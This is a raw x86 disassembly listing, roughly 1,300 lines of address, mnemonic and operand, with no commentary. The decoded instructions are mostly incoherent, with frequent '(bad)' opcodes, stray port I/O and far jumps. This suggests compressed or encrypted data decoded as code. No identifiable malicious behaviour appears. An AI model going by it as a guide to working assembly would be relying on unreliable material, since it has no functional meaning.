  41774a:	and    al,0x54
  41774c:	gs jnp 0x4176fe
  41774f:	pop    edx
  417750:	sub    ch,BYTE PTR [edx]
  417752:	popf   
  417753:	les    ebp,FWORD PTR [edx+0x9677242]
  417759:	push   cs
  41775a:	xchg   esp,eax
  41775b:	test   al,0xfe
  41775d:	out    0xff,eax
  41775f:	loop   0x417754
  417761:	xchg   BYTE PTR [eax],bl
  417763:	lods   al,BYTE PTR ds:[esi]
  417764:	sub    BYTE PTR [esi],bh
  417766:	mov    ds:0xb6426c99,eax
  41776b:	or     eax,0x4c59f5ba
  417770:	leave  
  417771:	or     eax,0xed01e490
  417776:	lds    eax,FWORD PTR [edi+0x22]
  417779:	ret    0x107d
  41777c:	retf   
  41777d:	ins    BYTE PTR es:[edi],dx
  41777e:	mov    ds:0xe2ec6de,eax
  417783:	cmc    
  417784:	adc    BYTE PTR ds:0x7b48f610,bl
  41778a:	sbb    eax,0xb42aa7a8
  41778f:	pop    esp
  417791:	loopne 0x4177ac
  417793:	movlps xmm6,QWORD PTR [edx-0x43]
  417797:	aas    
  417798:	pop    bx
  41779a:	inc    edx
  41779b:	sub    eax,0x78f00f35
  4177a0:	popf   
  4177a1:	pop    esi
  4177a2:	(bad)
  4177a6:	out    dx,al
  4177a7:	add    BYTE PTR [ebp+0x2855072d],bl
  4177ad:	push   es
  4177ae:	ja     0x41781b
  4177b0:	mov    esi,0xf6353d2f
  4177b5:	dec    esi
  4177b6:	int    0xbe
  4177b8:	mov    cl,0x60
  4177ba:	xchg   esi,eax
  4177bb:	loopne 0x41777c
  4177bd:	call   0xde997ede
  4177c2:	mov    ds:0x2ca3375f,eax
  4177c7:	pop    es
  4177c8:	lods   eax,DWORD PTR ds:[esi]
  4177c9:	inc    ecx
  4177ca:	cdq    
  4177cb:	xchg   ecx,eax
  4177cc:	pop    edi
  4177cd:	jle    0x5f202fdd
  4177d3:	add    al,0x5
  4177d5:	jns    0x417825
  4177d7:	dec    ebp
  4177d8:	or     eax,0xcf54f6fe
  4177dd:	sti    
  4177de:	into   
  4177df:	sbb    ebx,DWORD PTR [ecx+0x7beb1057]
  4177e5:	sbb    eax,0x23c211e0
  4177ea:	jo     0x4177ec
  4177ec:	and    DWORD PTR [edx+0x3d],0xffffffa1
  4177f0:	test   BYTE PTR [esi],0x71
  4177f3:	stos   BYTE PTR es:[edi],al
  4177f4:	paddd  mm7,QWORD PTR [edi-0x4d8bb96]
  4177fb:	(bad)  
  4177fc:	cdq    
  4177fd:	jo     0x4177d5
  4177ff:	push   cs
  417800:	adc    ebp,DWORD PTR [eax]
  417802:	lea    edx,[edx-0x5d97672a]
  417808:	and    DWORD PTR [edx+0x25dabeea],eax
  41780e:	inc    ecx
  41780f:	fwait
  417810:	dec    esp
  417811:	mov    eax,ds:0xa07faaea
  417816:	sub    al,0xea
  417818:	push   ecx
  417819:	and    al,0xd3
  41781b:	add    eax,DWORD PTR [esi+eax*1+0x29]
  41781f:	jmp    0x417884
  417821:	adc    BYTE PTR cs:[edx-0x2b],cl
  417825:	xchg   esp,eax
  417826:	std    
  417827:	dec    edi
  417828:	test   dl,al
  41782a:	ja     0x4177e8
  41782c:	mov    bl,0x6c
  41782e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41782f:	(bad)  
  417830:	loopne 0x417867
  417832:	jmp    0x4177ff
  417834:	hlt    
  417835:	scas   al,BYTE PTR es:[edi]
  417836:	adc    BYTE PTR [ebp+0x1564a71e],ch
  41783c:	mov    bl,0xb5
  41783e:	push   es
  41783f:	cmp    eax,0x684e81ab
  417844:	in     eax,dx
  417845:	sub    al,0xb3
  417847:	das    
  417848:	(bad)  
  417849:	lods   al,BYTE PTR ds:[esi]
  41784a:	cmp    eax,DWORD PTR [ebx-0x5e]
  41784d:	cs mov ebx,0xbe9326e8
  417853:	jbe    0x41788d
  417855:	bound  ebx,QWORD PTR [eax+0x0]
  417858:	add    esp,DWORD PTR ds:[ebp+0x3a]
  41785c:	pop    esi
  41785d:	in     eax,dx
  41785e:	jle    0x4178a4
  417860:	sbb    esp,DWORD PTR [ebx+ebp*2+0x79d9f60e]
  417867:	mov    edi,0xd37fffab
  41786c:	test   BYTE PTR [ecx+0x31e7575a],cl
  417872:	dec    ecx
  417874:	mov    ecx,esi
  417876:	sbb    eax,0xc9aec5b0
  41787b:	inc    edx
  41787c:	jge    0x417894
  41787e:	jmp    0x5cb:0x684fd65c
  417885:	into   
  417886:	add    eax,0x6dd5975a
  41788b:	xchg   edi,eax
  41788c:	aaa    
  41788d:	dec    esp
  41788e:	xchg   ebx,eax
  41788f:	push   esp
  417890:	int    0xd
  417892:	and    al,0x2e
  417894:	popa   
  417895:	(bad)  
  417896:	jle    0x4178bf
  417898:	addr16 iret 
  41789a:	sar    BYTE PTR [edx-0x710f7734],0xee
  4178a1:	call   DWORD PTR [ebx-0x438a5f24]
  4178a7:	fistp  QWORD PTR [ecx+ebx*1+0x7]
  4178ab:	lods   al,BYTE PTR ds:[esi]
  4178ac:	fisttp QWORD PTR [ebp-0x5938c90a]
  4178b2:	jns    0x417909
  4178b4:	jp     0x4178b3
  4178b6:	and    dl,BYTE PTR [edi+0x6c]
  4178b9:	lods   eax,DWORD PTR ds:[esi]
  4178ba:	jge    0x4178a8
  4178bc:	mov    ?,WORD PTR [ecx+0x1f]
  4178bf:	imul   edx,DWORD PTR [esi+0x1093c16],0x1aceae43
  4178c9:	fmul   DWORD PTR [eax]
  4178cb:	cmovle esi,ecx
  4178ce:	xor    eax,0xe7b6eb77
  4178d3:	es push ecx
  4178d5:	out    0x3b,al
  4178d7:	lahf   
  4178d8:	and    BYTE PTR [ebp-0x6],dh
  4178db:	inc    eax
  4178dc:	dec    esi
  4178dd:	push   0x6d
  4178df:	fstp   TBYTE PTR [esi+0x29d48a7a]
  4178e5:	xor    al,al
  4178e7:	sbb    al,0x87
  4178e9:	push   0xaae9b92e
  4178ee:	pushf  
  4178ef:	sub    al,BYTE PTR fs:[esi+0x61d866a2]
  4178f6:	in     eax,0xc4
  4178f8:	xor    al,0x58
  4178fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178fb:	out    dx,al
  4178fc:	mov    edx,?
  4178fe:	push   edx
  4178ff:	jp     0x4178c0
  417901:	mov    ch,0xc9
  417903:	mov    edi,0x6281ea47
  417908:	inc    edx
  417909:	gs call 0x85d2:0xa20b42a4
  417911:	jnp    0x41795a
  417913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417914:	call   0x8186:0xbbc481ea
  41791b:	jnp    0x41798b
  41791d:	mov    ebx,0x5627d7fa
  417922:	jns    0x4178de
  417924:	shl    BYTE PTR [edi+0x3e],cl
  417927:	int    0xbd
  417929:	xor    bl,BYTE PTR [ebp+0x18522d17]
  41792f:	lds    eax,FWORD PTR [esi]
  417931:	fwait
  417932:	add    eax,0x368a6e7b
  417937:	rcr    ebp,cl
  417939:	das    
  41793a:	retf   0xdd99
  41793d:	jno    0x417921
  41793f:	fnstenv [esi-0x6ceff765]
  417945:	push   es
  417946:	mov    dl,0x35
  417948:	mov    al,0x16
  41794a:	lahf   
  41794b:	adc    edx,ecx
  41794d:	loop   0x4178d1
  41794f:	ret    
  417950:	stos   DWORD PTR es:[edi],eax
  417951:	outs   dx,DWORD PTR ds:[esi]
  417952:	mov    ebx,0x3419dacf
  417957:	adc    eax,0x84bff5fd
  41795c:	fmul   QWORD PTR [ebx+eiz*1]
  41795f:	and    edi,esi
  417961:	jle    0x41797c
  417963:	dec    esi
  417964:	(bad)  
  417965:	add    ecx,DWORD PTR [edi+0x3b8f721e]
  41796b:	fxch   st(4)
  41796d:	dec    edi
  41796e:	xlat   BYTE PTR ds:[ebx]
  41796f:	push   ds
  417970:	bound  edx,QWORD PTR [esi]
  417972:	sub    BYTE PTR [edx-0x3d],0x89
  417976:	aaa    
  417977:	or     BYTE PTR [eax],0x89
  41797a:	fsubr  QWORD PTR [ecx-0x1ddbed89]
  417980:	mov    ds:0xe14aff06,al
  417985:	fdivp  st(3),st
  417987:	out    dx,al
  417988:	hlt    
  417989:	in     al,0x12
  41798b:	out    0x1d,al
  41798d:	add    al,BYTE PTR [edi]
  41798f:	cmp    eax,0x3b8c00ce
  417994:	ss pop ss
  417996:	stos   DWORD PTR es:[edi],eax
  417997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417998:	jbe    0x41799d
  41799a:	aam    0xf8
  41799c:	mov    edx,0xed560c5
  4179a1:	xlat   BYTE PTR ds:[ebx]
  4179a2:	(bad)  
  4179a3:	fimul  DWORD PTR [edi]
  4179a5:	mov    bh,0x3d
  4179a7:	(bad)  
  4179a8:	fild   DWORD PTR [eax+ebx*2-0x1901bec3]
  4179af:	sbb    BYTE PTR [edi+esi*1+0x19],dl
  4179b3:	test   al,0x98
  4179b5:	inc    ebx
  4179b6:	jae    0x41795b
  4179b8:	aad    0x2d
  4179ba:	dec    ebx
  4179bb:	inc    ebx
  4179bc:	mov    ah,0xdf
  4179be:	add    esp,DWORD PTR [ebx+0x25da8535]
  4179c4:	inc    edi
  4179c5:	out    0x6f,al
  4179c7:	cmp    DWORD PTR [esi],edx
  4179c9:	fwait
  4179ca:	sbb    cl,BYTE PTR [esi]
  4179cc:	call   0xac528748
  4179d1:	ret    
  4179d2:	mov    ?,ebp
  4179d4:	rcl    eax,0x71
  4179d7:	jb     0x4179fe
  4179d9:	in     al,0x75
  4179db:	dec    ebx
  4179dc:	xor    al,0xb0
  4179de:	push   esi
  4179df:	add    edi,DWORD PTR [esi-0x7c759618]
  4179e5:	test   DWORD PTR ds:0x10260b10,eax
  4179eb:	or     DWORD PTR [edx+0xdde7fc2],esi
  4179f1:	jno    0x417a2e
  4179f3:	mov    bl,0x44
  4179f5:	mov    dh,0x7e
  4179f7:	sub    ecx,ebx
  4179f9:	pop    ecx
  4179fa:	jmp    0x5a60:0x31d35114
  417a01:	loope  0x4179bb
  417a03:	jmp    0x281f:0xdb03dc1c
  417a0a:	jle    0x4179c2
  417a0c:	sub    bh,BYTE PTR [ebp-0x614c1425]
  417a12:	rol    DWORD PTR [esi-0x393ec8e0],1
  417a18:	dec    eax
  417a19:	sbb    DWORD PTR [ebx-0x35],ebp
  417a1c:	xor    DWORD PTR [edx],ecx
  417a1e:	xor    BYTE PTR [eax],bl
  417a20:	(bad)  
  417a21:	(bad)  
  417a22:	shl    BYTE PTR [edi-0x127529fa],0xb3
  417a29:	cdq    
  417a2a:	stos   BYTE PTR es:[edi],al
  417a2b:	dec    eax
  417a2c:	je     0x4179bb
  417a2e:	fisubr DWORD PTR ds:0xa2e2e25a
  417a34:	cmp    BYTE PTR [edx],cl
  417a36:	lahf   
  417a37:	test   BYTE PTR [eax+0x41e465a1],bh
  417a3d:	xor    esi,esp
  417a3f:	ds shl bl,1
  417a42:	mov    eax,0xd05b7a2b
  417a47:	inc    ebx
  417a48:	sub    eax,0xbd717091
  417a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a4e:	cmp    ah,BYTE PTR [ebx-0x20]
  417a51:	aad    0x1e
  417a53:	add    bl,BYTE PTR [edi-0x50a67c53]
  417a59:	mov    bh,0x88
  417a5b:	add    BYTE PTR [edi-0x1f39083],dl
  417a61:	lods   al,BYTE PTR ds:[esi]
  417a62:	pusha  
  417a63:	inc    ecx
  417a64:	mov    BYTE PTR [ebp-0x4a73ae2f],dh
  417a6a:	frstor [ebx-0x55a3980f]
  417a70:	mov    eax,0xbff2786e
  417a75:	out    dx,eax
  417a76:	pop    esi
  417a77:	jl     0x417aed
  417a79:	xchg   ecx,eax
  417a7a:	(bad)
  417a7e:	(bad)  
  417a7f:	mov    dl,0x7
  417a81:	mov    ebx,0xba1eba82
  417a86:	cmp    DWORD PTR ss:[edi+0x18ed58b6],edi
  417a8d:	mov    ?,WORD PTR [ebx+0x5f]
  417a90:	clc    
  417a91:	xor    dl,bl
  417a93:	dec    edx
  417a94:	lods   eax,DWORD PTR ds:[esi]
  417a95:	mov    dl,0x9c
  417a97:	cmc    
  417a98:	aad    0x1c
  417a9a:	mov    ebp,0xa8a05d78
  417a9f:	ret    
  417aa0:	inc    esi
  417aa1:	adc    dh,cl
  417aa3:	and    eax,0x864c866b
  417aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aa9:	or     esi,ebp
  417aab:	mov    dl,0x5d
  417aad:	cs xchg ebp,eax
  417aaf:	or     BYTE PTR [ecx],cl
  417ab1:	lock and eax,0x45ee4e74
  417ab7:	push   ecx
  417ab8:	loope  0x417aa8
  417aba:	jp     0x417b19
  417abc:	add    DWORD PTR [edi+0x365cecb3],esp
  417ac2:	ins    BYTE PTR es:[edi],dx
  417ac3:	mov    edi,0xc4213378
  417ac8:	and    al,0x3c
  417aca:	out    dx,eax
  417acb:	sti    
  417acc:	cmp    dh,BYTE PTR [esi-0x4b25691c]
  417ad2:	jmp    0x417ac6
  417ad4:	xor    DWORD PTR ss:[edi*2-0x674ce3de],0xffffffed
  417add:	sub    al,0x6a
  417adf:	jbe    0x417b55
  417ae1:	ror    edi,1
  417ae3:	js     0x417ab6
  417ae5:	mov    al,0x27
  417ae7:	jo     0x417a7d
  417ae9:	pop    edi
  417aea:	scas   al,BYTE PTR es:[edi]
  417aeb:	(bad)  
  417aed:	mov    ah,BYTE PTR [ecx*4-0x6ca19826]
  417af4:	xor    al,0xfd
  417af6:	retf   0xd2a2
  417af9:	sbb    BYTE PTR [eax],al
  417afb:	sbb    al,0xb6
  417afd:	pop    ecx
  417afe:	fstp   QWORD PTR [edi]
  417b00:	in     al,0x97
  417b02:	and    DWORD PTR ds:0x62fe1b91,eax
  417b08:	nop
  417b09:	mov    ss,WORD PTR [ebx]
  417b0b:	int3   
  417b0c:	mov    dl,0x49
  417b0e:	cmc    
  417b0f:	inc    esi
  417b10:	cmp    bl,BYTE PTR [edx-0x36]
  417b13:	mov    eax,0xee2469d4
  417b18:	lds    edx,FWORD PTR [ecx]
  417b1a:	test   DWORD PTR [esi],edi
  417b1c:	test   al,0x5b
  417b1e:	pushf  
  417b1f:	cmp    dl,BYTE PTR [eax-0x1e]
  417b22:	xchg   edx,eax
  417b23:	enter  0xd8f6,0x84
  417b27:	push   es
  417b28:	sbb    al,0xe6
  417b2a:	sub    al,0x67
  417b2c:	ins    BYTE PTR es:[edi],dx
  417b2d:	or     al,0xd3
  417b2f:	std    
  417b30:	or     ebx,DWORD PTR [edx+0x5]
  417b33:	fisub  DWORD PTR [esi-0x32163ecd]
  417b39:	lods   eax,DWORD PTR ds:[esi]
  417b3a:	jne    0x417b8a
  417b3c:	ret    0x48bd
  417b3f:	cmp    edx,ecx
  417b41:	popa   
  417b42:	jle    0x417baa
  417b44:	fnstcw WORD PTR [edx+eax*2+0x51]
  417b48:	xchg   ecx,eax
  417b49:	lahf   
  417b4a:	cmp    ecx,esp
  417b4c:	lock daa 
  417b4e:	add    bh,BYTE PTR [ecx+0x13]
  417b51:	(bad)  
  417b52:	mov    cl,0x54
  417b54:	cmp    BYTE PTR [edx+0x94d07b0],ah
  417b5a:	lock inc ecx
  417b5c:	xor    DWORD PTR [eax],ebp
  417b5e:	outs   dx,BYTE PTR ds:[esi]
  417b5f:	icebp  
  417b60:	clc    
  417b61:	xchg   bl,bh
  417b63:	push   0x5cd3934b
  417b68:	jbe    0x417b51
  417b6a:	mov    cl,0x2
  417b6c:	out    0xd6,al
  417b6e:	retf   0x3de7
  417b71:	jb     0x417bcc
  417b73:	jb     0x417bef
  417b75:	push   0x72
  417b77:	std    
  417b78:	mov    ecx,0x14c02855
  417b7d:	ret    0x6521
  417b80:	out    0xb1,eax
  417b82:	push   0x72
  417b84:	xor    DWORD PTR [esi+0x4d1bff1f],esp
  417b8a:	adc    al,0x8e
  417b8c:	adc    esp,eax
  417b8e:	jo     0x417b86
  417b90:	out    dx,al
  417b91:	movsx  esp,WORD PTR [edx+0x715e0a65]
  417b98:	imul   esi,DWORD PTR [esp+edi*8],0xffffffb0
  417b9c:	imul   ebx,DWORD PTR [edx],0x19af64d3
  417ba2:	into   
  417ba3:	xor    cl,bh
  417ba5:	stos   DWORD PTR es:[edi],eax
  417ba6:	push   ecx
  417ba7:	xchg   esi,eax
  417ba8:	adc    eax,DWORD PTR ds:0x7a6e76b4
  417bae:	cli    
  417baf:	inc    eax
  417bb0:	xchg   ebx,eax
  417bb1:	fs and eax,0xe6de3e51
  417bb7:	xor    esp,DWORD PTR [edx-0x6d]
  417bba:	jne    0x417b62
  417bbc:	push   ebx
  417bbd:	add    eax,0x76c445e5
  417bc2:	push   ebx
  417bc3:	test   al,0x9a
  417bc5:	adc    BYTE PTR [edx+esi*4+0x22389d2e],0x75
  417bcd:	mov    edx,0x505cbed6
  417bd2:	rcl    ecx,cl
  417bd4:	ds xor eax,0xbdfc4e02
  417bda:	push   eax
  417bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bdc:	mov    eax,0x2e2b0303
  417be1:	fs ds (bad) 
  417be4:	stc    
  417be5:	inc    ebp
  417be6:	in     eax,dx
  417be7:	sub    edx,eax
  417be9:	retf   
  417bea:	jmp    0x4c596492
  417bef:	test   ecx,ebx
  417bf1:	call   FWORD PTR [edx]
  417bf3:	loop   0x417c41
  417bf5:	fxam   
  417bf7:	mov    ds,WORD PTR [eax]
  417bf9:	sbb    ah,dl
  417bfb:	jo     0x417be5
  417bfd:	mov    bl,0xa1
  417bff:	mov    esi,0x65d18b95
  417c04:	mov    edx,ebx
  417c06:	jns    0x417c41
  417c08:	jb     0x417c5b
  417c0a:	and    dh,BYTE PTR [edi-0x6]
  417c0d:	je     0x417c69
  417c0f:	xchg   esi,eax
  417c10:	pop    ebx
  417c11:	or     DWORD PTR [esi],eax
  417c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c14:	aam    0xd2
  417c16:	pop    ss
  417c17:	xor    BYTE PTR [edx+0x25675a3c],0xe
  417c1e:	jo     0x417c9c
  417c20:	test   al,0x2e
  417c22:	mov    edi,0x96becfc
  417c27:	xchg   ebp,eax
  417c28:	sub    BYTE PTR [eax],ch
  417c2a:	ss call 0xa057:0xe71da0d3
  417c32:	lods   al,BYTE PTR ds:[esi]
  417c33:	pop    ebx
  417c34:	iret   
  417c35:	add    ch,dl
  417c37:	mov    ebx,0x6e8c498a
  417c3c:	inc    ebp
  417c3d:	or     al,0xf7
  417c3f:	test   DWORD PTR [ecx-0x75],0xae50e1ae
  417c46:	retf   0x3ee9
  417c49:	(bad)  
  417c4a:	and    eax,0xee616e61
  417c4f:	cmp    eax,0x555f7426
  417c54:	adc    al,0x6d
  417c56:	push   ds
  417c57:	repz retf 
  417c59:	pushf  
  417c5a:	push   DWORD PTR [ecx+0x22]
  417c5d:	dec    ecx
  417c5e:	xor    al,0xbf
  417c60:	or     BYTE PTR ds:0x63466386,0xcb
  417c67:	pusha  
  417c68:	jge    0x417c33
  417c6a:	add    al,0xd0
  417c6c:	bound  ebx,QWORD PTR [ebp+0x60d041dd]
  417c72:	inc    esp
  417c73:	or     esi,eax
  417c75:	pop    edx
  417c76:	ds jb  0x417c03
  417c79:	cmp    BYTE PTR [ebx-0x61e1d4c7],0x5c
  417c80:	add    eax,0xf19d67db
  417c85:	in     al,dx
  417c86:	xor    al,0x29
  417c88:	sbb    BYTE PTR [edi+edx*4-0x2d],dl
  417c8c:	push   esp
  417c8d:	dec    eax
  417c8e:	bound  esp,QWORD PTR [ebx+0x44]
  417c91:	sub    bl,BYTE PTR [edx]
  417c93:	stos   DWORD PTR es:[edi],eax
  417c94:	or     BYTE PTR [eax+0x3f],cl
  417c97:	push   ds
  417c98:	stc    
  417c99:	mov    ebp,DWORD PTR [ecx-0x3c4e4ae9]
  417c9f:	lock out dx,al
  417ca1:	int3   
  417ca2:	push   esi
  417ca3:	push   edi
  417ca4:	ss dec eax
  417ca6:	sbb    eax,DWORD PTR [ecx]
  417ca8:	jge    0x417c2f
  417caa:	pop    ss
  417cab:	imul   eax,DWORD PTR [ebx+0x3d],0x1193805c
  417cb2:	aas    
  417cb3:	push   edx
  417cb4:	lds    edx,FWORD PTR [ebx+eax*1-0x60]
  417cb8:	jnp    0x417d07
  417cba:	pushf  
  417cbb:	jbe    0x417c54
  417cbd:	lock ror DWORD PTR [ebx+0x498d9bbf],0xa2
  417cc5:	push   cs
  417cc6:	adc    ah,BYTE PTR ds:0x6e552290
  417ccc:	xor    bl,ch
  417cce:	call   0x478:0x8062b794
  417cd5:	add    eax,0x9a70f067
  417cda:	sub    ecx,ecx
  417cdc:	aas    
  417cdd:	jecxz  0x417ce2
  417cdf:	in     eax,dx
  417ce0:	lods   eax,DWORD PTR ds:[esi]
  417ce1:	xor    al,0x64
  417ce3:	jne    0x417d07
  417ce5:	mov    ebx,0x2756e92e
  417cea:	shr    edx,cl
  417cec:	xor    BYTE PTR [edi+0x99a8c3c],0xe0
  417cf3:	into   
  417cf4:	icebp  
  417cf5:	and    edi,0x79
  417cf8:	cwde   
  417cf9:	or     al,0x47
  417cfb:	fs push esp
  417cfd:	std    
  417cfe:	and    ecx,DWORD PTR ds:0xc83188d0
  417d04:	cmp    al,0x1a
  417d06:	(bad)  
  417d08:	aaa    
  417d09:	retf   
  417d0a:	xor    eax,0x3d549b83
  417d0f:	push   ds
  417d10:	lock call 0x67e0d92d
  417d16:	jmp    0x60030a6d
  417d1b:	sti    
  417d1c:	jo     0x417d8c
  417d1e:	xchg   esi,eax
  417d1f:	push   ebx
  417d20:	jecxz  0x417cc8
  417d22:	loop   0x417d95
  417d24:	inc    edx
  417d25:	and    esi,DWORD PTR [ebx-0x5d]
  417d28:	cwde   
  417d29:	or     DWORD PTR [edx],ebp
  417d2b:	sbb    eax,0x7fb6ebcc
  417d30:	adc    ch,bh
  417d32:	mov    DWORD PTR [ebx-0x6c2f467b],ebp
  417d38:	jns    0x417d0d
  417d3a:	dec    edx
  417d3b:	std    
  417d3c:	shl    bh,cl
  417d3e:	scas   al,BYTE PTR es:[edi]
  417d3f:	pop    es
  417d40:	(bad)  
  417d41:	push   0x34
  417d43:	(bad)  
  417d44:	call   0xd984:0xcc90ad22
  417d4b:	jae    0x417d2d
  417d4d:	dec    ecx
  417d4e:	or     edx,DWORD PTR [esi+0x7f61f521]
  417d54:	push   ebp
  417d55:	jae    0x417da7
  417d57:	and    edi,DWORD PTR [edx+eiz*1+0x1f15b21a]
  417d5e:	push   ss
  417d5f:	add    al,0x16
  417d61:	arpl   WORD PTR [edi-0x68],bp
  417d64:	test   DWORD PTR [edx*8-0x70504253],ebp
  417d6b:	aaa    
  417d6c:	cdq    
  417d6d:	or     al,BYTE PTR [eax-0x2c]
  417d70:	mov    al,0x93
  417d72:	xchg   ebx,eax
  417d73:	pop    esi
  417d74:	call   0x8013dc0c
  417d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d7a:	cli    
  417d7b:	in     eax,0x6d
  417d7d:	inc    esi
  417d7e:	xchg   ebp,eax
  417d7f:	sbb    eax,0xa2a7f087
  417d84:	adc    al,0xc2
  417d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d87:	cmp    esp,DWORD PTR [edi-0x52e7ed13]
  417d8d:	mov    DWORD PTR [esi+esi*4],0x61782f85
  417d94:	std    
  417d95:	jbe    0x417d59
  417d97:	aaa    
  417d98:	mov    ebx,0x479fe41
  417d9d:	push   edx
  417d9e:	pushf  
  417d9f:	mov    DWORD PTR [ebx+ecx*2],ebx
  417da2:	fldenv [esi]
  417da4:	fmul   DWORD PTR [esi+0x3e]
  417da7:	cmp    dh,BYTE PTR [ecx]
  417da9:	repz dec ecx
  417dab:	xor    eax,DWORD PTR [edx-0x33bb8e1e]
  417db1:	and    DWORD PTR [ebx-0x60],ecx
  417db4:	data16 add BYTE PTR [ebx+0x407db0e1],ch
  417dbb:	jecxz  0x417e37
  417dbd:	and    al,0x62
  417dbf:	mov    ebx,edi
  417dc1:	ins    BYTE PTR es:[edi],dx
  417dc2:	in     eax,dx
  417dc3:	pop    ebx
  417dc4:	sub    ch,BYTE PTR [ebx]
  417dc6:	fcom   DWORD PTR [esi-0x5e7a4691]
  417dcc:	sub    eax,0xc0813a43
  417dd1:	adc    eax,DWORD PTR [ebp-0x330f1b80]
  417dd7:	adc    edx,DWORD PTR [ecx]
  417dd9:	jmp    0x417e06
  417ddb:	les    esp,FWORD PTR [ebx]
  417ddd:	fucom  st(1)
  417ddf:	lods   al,BYTE PTR ds:[esi]
  417de0:	(bad)  
  417de1:	add    cl,BYTE PTR [edi+edx*1+0x25b0453b]
  417de8:	push   es
  417de9:	xor    dl,0x90
  417dec:	stc    
  417ded:	jmp    FWORD PTR [ebp-0xf]
  417df0:	cmp    eax,eax
  417df2:	shr    esp,0xed
  417df5:	xchg   DWORD PTR [ebx-0x7ff9fa44],eax
  417dfb:	test   DWORD PTR [edi+ebx*1+0x50],esp
  417dff:	rol    BYTE PTR [ecx],1
  417e01:	inc    ecx
  417e02:	push   edx
  417e03:	and    al,0x8c
  417e05:	or     edi,DWORD PTR [ebx]
  417e07:	push   edi
  417e08:	sub    al,0xd3
  417e0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e0b:	xlat   BYTE PTR ds:[ebx]
  417e0c:	sbb    DWORD PTR ds:0xfba33a70,ebp
  417e12:	cli    
  417e13:	retf   
  417e14:	cmp    al,0xde
  417e16:	(bad)  
  417e18:	ins    BYTE PTR es:[edi],dx
  417e19:	adc    eax,0x31a01c46
  417e1e:	mov    dl,0x8d
  417e20:	pop    esp
  417e21:	test   DWORD PTR [edx+0x49ba8bb4],ecx
  417e27:	or     dl,al
  417e29:	mov    edx,0x45b40c75
  417e2e:	out    dx,eax
  417e2f:	jmp    0x844e:0x7345cd7b
  417e36:	jbe    0x417e24
  417e38:	popa   
  417e39:	nop
  417e3a:	lea    eax,[esi]
  417e3c:	shl    BYTE PTR [edx],0xa3
  417e3f:	imul   eax,esi,0xd4d80075
  417e45:	(bad)  
  417e46:	fnstcw WORD PTR [edi+0x5133c4c3]
  417e4c:	xchg   BYTE PTR ds:0x9d2cd5b8,dh
  417e52:	push   0xf2205ff9
  417e57:	test   al,0x5
  417e59:	daa    
  417e5a:	mov    edx,0xf01afe6a
  417e5f:	push   eax
  417e60:	aaa    
  417e61:	inc    edx
  417e62:	ins    DWORD PTR es:[edi],dx
  417e63:	sbb    DWORD PTR [ebp-0x78f35b32],eax
  417e69:	push   ecx
  417e6a:	cmp    eax,0x338c5275
  417e6f:	aaa    
  417e70:	mov    esi,0xa264566f
  417e75:	fdivr  DWORD PTR [ebp-0x74]
  417e78:	or     al,0x71
  417e7a:	adc    esi,DWORD PTR [ecx+0x309eaaef]
  417e80:	and    BYTE PTR [eax-0x5d9cfe18],0x20
  417e87:	dec    edx
  417e88:	push   ecx
  417e89:	lea    eax,[edx-0x13]
  417e8c:	and    bh,dl
  417e8e:	sbb    eax,DWORD PTR [eax-0x54b5a2e5]
  417e94:	fidiv  WORD PTR [esi-0x5b]
  417e97:	dec    edi
  417e98:	fstp   DWORD PTR [esi+0x76]
  417e9b:	loopne 0x417ecd
  417e9d:	jge    0x417ecb
  417e9f:	mov    WORD PTR [ebx+ebp*1+0x7a1ea19b],fs
  417ea6:	adc    DWORD PTR [eax+ecx*2+0x8],esi
  417eaa:	(bad)  
  417eab:	sti    
  417eac:	loopne 0x417e93
  417eae:	adc    bh,BYTE PTR [esi+0x4c5ba06a]
  417eb4:	loope  0x417ed2
  417eb6:	call   0xfdceeb0c
  417ebb:	pop    ds
  417ebc:	pop    ebx
  417ebd:	lea    eax,[ecx]
  417ebf:	pop    edi
  417ec0:	sub    DWORD PTR [edx],esi
  417ec2:	cmp    al,bh
  417ec4:	(bad)  
  417ec5:	push   ecx
  417ec6:	aaa    
  417ec7:	push   ecx
  417ec8:	push   es
  417ec9:	and    eax,0xa808d8b8
  417ece:	lahf   
  417ecf:	hlt    
  417ed0:	stc    
  417ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ed2:	(bad)  
  417ed3:	jmp    0xba41:0x6f845dd9
  417eda:	je     0x417f07
  417edc:	ins    BYTE PTR es:[edi],dx
  417edd:	dec    eax
  417ede:	dec    ebp
  417edf:	and    ebx,DWORD PTR [ebp+0x49]
  417ee2:	lds    esp,FWORD PTR [eax]
  417ee4:	call   0xc9c:0xfebcdfa
  417eeb:	aad    0x20
  417eed:	or     al,0x35
  417eef:	retf   0xf6a3
  417ef2:	cmp    al,BYTE PTR [esp+edx*1+0x45]
  417ef6:	jo     0x417f57
  417ef8:	push   ds
  417ef9:	fsubp  st(5),st
  417efb:	imul   DWORD PTR [ebx]
  417efd:	fwait
  417efe:	mov    edi,0xfa5e5b96
  417f03:	imul   ah
  417f05:	aad    0xbb
  417f07:	out    0xaf,eax
  417f09:	test   eax,0x9ef066b5
  417f0e:	inc    edx
  417f0f:	pop    ecx
  417f10:	int    0xce
  417f12:	out    0xa2,al
  417f14:	aas    
  417f15:	sub    eax,0x788bdf9a
  417f1a:	test   al,0x92
  417f1c:	les    ebp,FWORD PTR [ecx]
  417f1e:	mov    ebx,0xcc8cfcf6
  417f23:	ror    BYTE PTR [edx+0x4058100],0x90
  417f2a:	inc    edx
  417f2b:	add    BYTE PTR [esi+0x24],cl
  417f2e:	add    BYTE PTR [eax],al
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
